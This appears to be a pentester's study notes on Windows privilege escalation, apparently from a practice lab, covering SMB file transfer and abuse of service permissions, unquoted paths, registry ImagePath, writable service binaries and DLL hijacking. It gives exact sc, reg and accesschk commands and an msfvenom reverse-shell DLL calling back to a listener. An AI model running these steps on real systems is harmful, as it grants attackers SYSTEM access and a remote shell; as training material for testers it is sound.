


# File Transfers

 Run this following command on the directory including the file and this will start a smb share of that dir

> sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py directoryname .

- Now on victim machine  

> copy \\IP\directoryname\filename localpathwheretosave




# Privilege escalation


## Service exploits

      we have to replace the service names with names found on target from winpeas
### Insecure Service Permissions

this exploit is like path manipulation.WE see that if we have permissions to change settings of a certain service
and we can stop or start the service then we can poiny it to our malicious executable file and when we restart the service
our executable run as SYSTEM



we can use following command to see permissions of services using winpeas

> .\winpeas.exe servicesinfo

we get the services which we can possibly modify

Now we use accesschk.exe to see the which permissions we can abuse of that service

> .\accesschk.exe /accepteula -uwcqv username servicename

!!This vector only work if we have stop or start service permission available else its a rabithole.
!! The service must also have SERVICE_CHANGE_CONFIG which allows us to modify permissions


Now we can interact with service 

> sc qc servicename

!!The service must also have SERVICE_START_NAME set to system so we know it runs as SYSTEM.

Now we will change the BInarypath to  our executable

> sc config servicename binpath= "\"C:\PrivEsc\reverse.exe\""


We can see the status of service by

> sc query servicename

 If it is running then we have to stop the service and again start the service

If it is stopped then just start the service and our file will be executed

> net start servicename


### Unquoted service path

we can abuse this service due to insecure path validity in windows. service name is unquotedsvc
 suppose we have a path

c:\program files\common files\file.exe

when we run file.exe using absolute path,windows call unquotedsvc to check each possible directory to see if it is 
executable or not .That means first windows will check\program to see if  its an exectuable,if not then it will check
\common as executable and then like this we run our proper executable. So we cann add our executable before the original file
and execute that


Fist query the unquotedsvc to see if we have proper start,stop and system permission for the service

After confirming this we have to see which path is writable so we can write

we can find that by using.We gradually see all the partial directories to see if its writable .NOte this
c:\programfiles\unquotedpathserviece is just an example

> \accesschk.exe /accepteula -uwdq "C:\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"  

Now just move our malicuous file to a writable path so its executed before the original

> copy exploit.exe "C:\Program Files\Unquoted Service Files\exploit.exe"


Now just start the unquotedsvc

> net start unquotedsvc 

### Weak registry permissions

- First identify the path which is vulnerbale to this attack

-then query it to see its inf0

> sc qc regsvc

SERVICE_START_NAME must be set to system so we know that root is runng the service

- Now we use accesschk to see which permissions we have

> .\accesschk /accepteula -uvwqk registrypath or regisrtry (conditianal)


now we point our executable to the registry config so it gets executed

> reg add weakregistrypath /v ImagePath /t REG_EXPAND_SZ /d pathtoourfile /f



### Writable insecure services

In this we usually exploit if any service being ran by system is writable by us 

We will simply overwrite the service with our code and then simpply restart it


First we check if we Authority permission on the service

> sc qz filepermsvc

Now we use accesschk to see if we have writa permission to service binary

> .\accesschk.exe /accepteula -quvw "Path to service"


If its writable then we overwrite it woth our malicius file

> copy maliciousfilepath  "service path" /Y


Now we restart the service

> net start filepermsvc

### DLL hijacking

This attack works when the dll service look for libraries in different paths in windows and if any path is writable by us
then we can simply create dll msfvenom payload and write to that path and when we start the dllservice that malicius
payload is loaded and run

In winpeas output see if any dll path is writable

then query the dllservice to see if that is being run by System

> sc qc dllsvc

Now check our permission using accesschk

> .\accesschk /accepteula -uvqc username dllservicenmae

Now if we can start or stop the service then we will proceed

Now create a msfvenom payload for dll hijack in our linux and transfer it using smb technique

> mfsvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f dll -o hijack.dll

Now start the service

> net start dllsvc












# ####

















